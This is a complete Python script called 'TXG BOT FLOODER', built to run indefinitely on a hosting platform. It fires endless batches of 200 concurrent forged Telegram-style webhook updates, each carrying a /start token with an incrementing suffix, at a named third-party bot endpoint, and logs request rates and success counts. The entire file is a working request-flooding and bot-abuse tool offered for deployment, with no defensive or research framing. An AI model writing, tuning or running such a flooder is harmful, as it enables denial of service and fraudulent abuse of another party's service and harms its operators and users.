#!/usr/bin/env python3
"""
🔥 TXG BOT FLOODER – Railway Deploy Ready (Infinite + Polling)
"""
import asyncio
import aiohttp
import time
import os
import signal
import sys
from aiohttp import web

# ─── CONFIG ──────────────────────────────────────────────
URL = "https://txg-gateway.xyz/api/bot.php"
USER_ID = 8401097557

BATCH_SIZE = 200              # per batch
TIMEOUT = 15
DELAY_BETWEEN_BATCHES = 1
CONCURRENT_LIMIT = 200

# ─── STATS ──────────────────────────────────────────────
stats = {'sent': 0, 'ok': 0, 'fail': 0, 'timeout': 0}
stats_lock = asyncio.Lock()
start_time = time.time()

# ─── PAYLOAD ────────────────────────────────────────────
def get_payload(message_id, update_id):
    return {
        "update_id": update_id,
        "message": {
            "message_id": message_id,
            "chat": {"id": USER_ID, "type": "private"},
            "from": {"id": USER_ID, "is_bot": False},
            "text": f"/start f39cde2da120338ced075c31adbaef2c_{message_id}"
        }
    }

# ─── REQUEST SENDER ──────────────────────────────────────
async def send_request(session, req_index, message_id, update_id):
    payload = get_payload(message_id, update_id)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    try:
        async with session.post(URL, json=payload, timeout=timeout) as resp:
            status = resp.status
            text = await resp.text()
            print(f"Req {req_index} (Msg {message_id}) → {status} | {text.strip()[:50]}...")
            async with stats_lock:
                stats['sent'] += 1
                if status == 200:
                    stats['ok'] += 1
                else:
                    stats['fail'] += 1
            return status
    except asyncio.TimeoutError:
        print(f"Req {req_index} (Msg {message_id}) → ⏱️ TIMEOUT")
        async with stats_lock:
            stats['sent'] += 1
            stats['timeout'] += 1
            stats['fail'] += 1
    except Exception as e:
        print(f"Req {req_index} (Msg {message_id}) → ❌ ERROR: {e}")
        async with stats_lock:
            stats['sent'] += 1
            stats['fail'] += 1
    return None

# ─── MAIN FLOOD LOOP (Infinite) ──────────────────────────
async def flooder():
    msg_id = 1
    upd_id = 123457
    batch_count = 1
    req_count = 1

    connector = aiohttp.TCPConnector(limit=CONCURRENT_LIMIT, limit_per_host=CONCURRENT_LIMIT)
    async with aiohttp.ClientSession(connector=connector) as session:
        print(f"🔥 TXG Bot Flooder Started (Infinite)")
        print(f"👤 User ID: {USER_ID}")
        print(f"📦 Batch Size: {BATCH_SIZE}")
        print(f"⏱️  Timeout: {TIMEOUT}s\n")

        while True:   # Infinite loop – kabhi rukega nahi
            tasks = []
            start_msg = msg_id

            for _ in range(BATCH_SIZE):
                tasks.append(send_request(session, req_count, msg_id, upd_id))
                msg_id += 1
                upd_id += 1
                req_count += 1

            print(f"\n--- Batch {batch_count}: Msg {start_msg} → {msg_id-1} ---")
            results = await asyncio.gather(*tasks)

            success = results.count(200)
            print(f"✅ Batch {batch_count} Done | Success: {success}/{BATCH_SIZE}\n")

            batch_count += 1
            await asyncio.sleep(DELAY_BETWEEN_BATCHES)

# ─── POLLING STATUS (Live Stats every second) ──────────
async def status_poller():
    while True:
        await asyncio.sleep(2)
        elapsed = time.time() - start_time
        async with stats_lock:
            s = stats['sent']
            o = stats['ok']
            f = stats['fail']
            t = stats['timeout']
        rate = s / elapsed if elapsed > 0 else 0
        ok_pct = (o / s * 100) if s > 0 else 0
        print(f"\r📊 Sent: {s:,}  ✅ OK: {o:,} ({ok_pct:.1f}%)  ❌ Errors: {f:,}  ⏱️ Timeouts: {t:,}  ⚡ {rate:.1f} req/s", end='', flush=True)

# ─── HEALTH CHECK WEB SERVER ─────────────────────────────
async def health(request):
    return web.Response(text="✅ Bot Flooder is online", status=200)

async def run_webserver():
    app = web.Application()
    app.router.add_get('/', health)
    app.router.add_get('/health', health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8080"))
    site = web.TCPSite(runner, host='0.0.0.0', port=port)
    await site.start()
    print(f"🌐 Web server started on port {port}")
    await asyncio.Event().wait()

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    # Run flooder, status poller and web server concurrently
    flooder_task = asyncio.create_task(flooder())
    poller_task = asyncio.create_task(status_poller())
    web_task = asyncio.create_task(run_webserver())

    await asyncio.gather(flooder_task, poller_task, web_task)

if __name__ == "__main__":
    def signal_handler(sig, frame):
        print("\n🛑 Shutting down...")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Exiting.")
